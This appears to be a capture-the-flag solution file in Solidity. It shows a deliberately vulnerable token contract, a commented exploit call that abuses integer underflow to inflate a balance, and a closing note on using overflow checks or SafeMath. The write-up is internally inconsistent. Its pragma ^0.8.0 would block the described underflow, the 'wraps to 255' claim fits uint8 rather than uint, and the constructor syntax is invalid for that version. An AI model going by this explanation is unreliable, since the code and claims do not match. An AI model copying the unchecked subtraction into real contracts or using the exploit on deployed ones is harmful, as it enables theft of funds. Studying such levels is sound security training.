// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

// contract: 0x5d697d0ff3788fa4ed70BfD9bD87Adc2B03da36b

// await web3.eth.getBalance("0x5d697d0ff3788fa4ed70BfD9bD87Adc2B03da36b") => "0"

// Use underflow/overflow of the unsigned integer =D
// Sending 21 ETH will leave us with 255 ETH, as a uint will loop around to the next value.
// await contract.transfer("0x70a09399794331A64772E15C170b591BB6b9cf16", toWei("21")) => tx:0x25c71cae798476bbeb8449585513c2a84ce9b58b6a4a360096b3e9512db01095

// Hacked contract!

/*
Overflows are very common in solidity and must be checked for with control statements such as:

if(a + c > a) {
  a = a + c;
}
An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

a = a.add(c);
If there is an overflow, the code will revert.
*/